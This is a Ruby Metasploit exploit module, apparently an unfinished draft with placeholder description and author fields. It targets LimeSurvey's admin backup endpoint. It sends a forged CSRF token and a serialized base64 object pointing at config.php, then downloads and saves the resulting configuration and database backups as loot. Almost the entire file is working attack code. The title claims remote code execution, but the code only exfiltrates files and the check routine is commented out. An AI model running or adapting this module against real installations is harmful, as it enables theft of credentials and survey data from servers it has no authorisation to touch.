##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Limesurvey Remote PHP Code Execution',
      'Description'    => %q{
        Bla bla bla
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Change Me',                           # discovery
          'Mehmet Ince <mehmet@mehmetince.net>'  # msf module
        ],
      'References'     =>
        [
          ['URL', 'https://www.changeme.com']
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [ ['Automatic', {}] ],
      'DisclosureDate' => 'Jul 13 2016',
      'DefaultTarget'  => 0
      ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The target URI of the LimeSurvey installation', '/'])
      ]
    )
  end

  def check
    # res = send_request_cgi(
    #   'method' => 'GET',
    #   'uri' => normalize_uri(target_uri.path, 'index.php'),
    #   'vars_get' => {
    #     'q' => "taxonomy_vocabulary//passthru/printf '#{Rex::Text.to_octal(r)}'"
    #   }
    # )
    # if res && res.body.include?(r)
    #   Exploit::CheckCode::Vulnerable
    # else
    #   Exploit::CheckCode::Safe
    # end
  end

  def unzip_file(zipfile)
    zip_data = Hash.new
    begin
      Zip::File.open_buffer(zipfile) do |filezip|
        filezip.each do |entry|
          zip_data[::File.expand_path(entry.name)] = filezip.read(entry)
        end
      end
    rescue Zip::Error => e
      print_error("Error extracting ZIP: #{e}")
    end
    return zip_data
  end

  def exploit
    dump_config_db
  end

  def dump_config_db()
    c = rand_text_alpha(8 + rand(4))
    r = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path, "index.php", "admin", "update", "backup"),
        'method' => "POST",
        'cookie' => "YII_CSRF_TOKEN=#{c}",
        'vars_post' => {
          'YII_CSRF_TOKEN' => c,
          'destinationBuild' => '160920',
          'datasupdateinfo' => 'YToxOntzOjQ6ImZpbGUiO086ODoic3RkQ2xhc3MiOjE6e3M6NDoiZmlsZSI7czozMDoiL2FwcGxpY2F0aW9uL2NvbmZpZy9jb25maWcucGhwIjt9fQ=='
        }
      })

    if r && r.body.include?("File backup created:")
      print_status("Config backup created.")

      # Config dump
      if r.body =~ /<a class="btn btn-success" href="(#{Regexp.escape(full_uri)}tmp\/LimeSurvey_files_backup_(.*)\.zip)" title="Download this file">Download this file<\/a>/
        config_url = $1
      end

      # Fetch Config Backup and unzip it.
      res = send_request_cgi(
        {
          'method' => 'GET',
          'uri' => config_url
        })

      if res && res.code == 200
        unzipped = unzip_file(res.body)
        print_good("Saving config.php content into the loot.")
        unzipped.each do |filename, content|
          path = store_loot(
            'limesurvey.http',
            'application/octet-stream',
            rhost,
            content,
            filename
          )
        end
      else
        print_error("Error occurred during file download. Here is the backup zip URL = #{config_url}")
      end
    else
      print_error("Config dump is not available. Your target may patched the issue.")
    end

    # DB Dump
    if r && r.body.include?("DB backup created")
      print_status("DB backup created. Trying to download it...")
      if r.body =~ /<a class="btn btn-success" href="(#{Regexp.escape(full_uri)}tmp\/LimeSurvey_database_backup_(.*)\.zip)" title="Download this file">Download this file<\/a>/
        db_url = $1
        vprint_status("Database Dump URL = #{db_url}")
      end

      # Fetch DB and unzip it.
      res = send_request_cgi(
        {
          'method' => 'GET',
          'uri' => db_url
        })

      if res && res.code == 200
        print_good("Saving database dump into the loot.")
        unzipped = unzip_file(res.body)
        unzipped.each do |filename, content|
          path = store_loot(
            'limesurvey.http',
            'application/octet-stream',
            rhost,
            content,
            filename
          )
        end
      else
        print_error("Error occurred during file download. Here is the backup zip URL = #{db_url}")
      end
    end

  end
end
